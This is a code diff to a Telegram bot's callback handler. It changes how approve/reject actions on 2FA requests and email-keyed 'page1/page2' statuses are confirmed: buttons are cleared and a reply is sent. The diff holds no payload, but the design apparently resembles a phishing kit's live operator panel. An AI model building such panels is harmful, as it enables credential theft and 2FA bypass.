@@ -189,6 +189,7 @@ bot.on("callback_query", async (query) => {
     // --- Handle 2FA approve/reject separately ---
     if (action === "2fa_approve" || action === "2fa_reject") {
       const twoFaStatus = action === "2fa_approve" ? "approved" : "rejected";
+      const twoFaEmoji = twoFaStatus === "approved" ? "✅" : "❌";
 
       await fetch(`${APP_URL}/api/update-2fa-status`, {
         method: "POST",
@@ -196,16 +197,26 @@ bot.on("callback_query", async (query) => {
         body: JSON.stringify({ requestId: identifier, status: twoFaStatus })
       });
 
+      // Step 1: Remove buttons from original message (keep info visible)
       try {
-        await bot.editMessageText(
-          `🔐 2FA Request <b>${identifier}</b> has been <b>${twoFaStatus.toUpperCase()}</b>`,
+        await bot.editMessageReplyMarkup(
+          { inline_keyboard: [] },
           {
             chat_id: query.message.chat.id,
-            message_id: query.message.message_id,
-            parse_mode: "HTML"
+            message_id: query.message.message_id
           }
         );
       } catch (_) {}
+
+      // Step 2: Send status as a new reply below the original message
+      await bot.sendMessage(
+        query.message.chat.id,
+        `${twoFaEmoji} <b>${twoFaStatus.toUpperCase()}</b>`,
+        {
+          parse_mode: "HTML",
+          reply_to_message_id: query.message.message_id
+        }
+      );
 
       await bot.answerCallbackQuery(query.id, { text: `❗️${twoFaStatus.toUpperCase()}❗️` });
       return;
@@ -217,6 +228,8 @@ bot.on("callback_query", async (query) => {
     else if (action === "page2") status = "accepted2";
     else status = "rejected";
 
+    const statusEmoji = status === "accepted" || status === "accepted1" || status === "accepted2" ? "✅" : "❌";
+
     // Notify backend
     await fetch(`${APP_URL}/update-status`, {
       method: "POST",
@@ -224,26 +237,26 @@ bot.on("callback_query", async (query) => {
       body: JSON.stringify({ email: identifier, identifier, status })
     });
 
-    // Try HTML first, fallback to Markdown
+    // Step 1: Remove buttons from original message (keep info visible)
     try {
-      await bot.editMessageText(
-        `🔐 <b>${identifier}</b> has been <b>${status.toUpperCase()}</b>`,
+      await bot.editMessageReplyMarkup(
+        { inline_keyboard: [] },
         {
           chat_id: query.message.chat.id,
-          message_id: query.message.message_id,
-          parse_mode: "HTML"
+          message_id: query.message.message_id
         }
       );
-    } catch {
-      await bot.editMessageText(
-        `🔐 ${identifier} has been *${status.toUpperCase()}*`,
-        {
-          chat_id: query.message.chat.id,
-          message_id: query.message.message_id,
-          parse_mode: "Markdown"
-        }
-      );
-    }
+    } catch (_) {}
+
+    // Step 2: Send status as a new reply below the original message
+    await bot.sendMessage(
+      query.message.chat.id,
+      `${statusEmoji} <b>${identifier}</b> → <b>${status.toUpperCase()}</b>`,
+      {
+        parse_mode: "HTML",
+        reply_to_message_id: query.message.message_id
+      }
+    );
 
     await bot.answerCallbackQuery(query.id, { text: `❗️${status.toUpperCase()}❗️` });
 
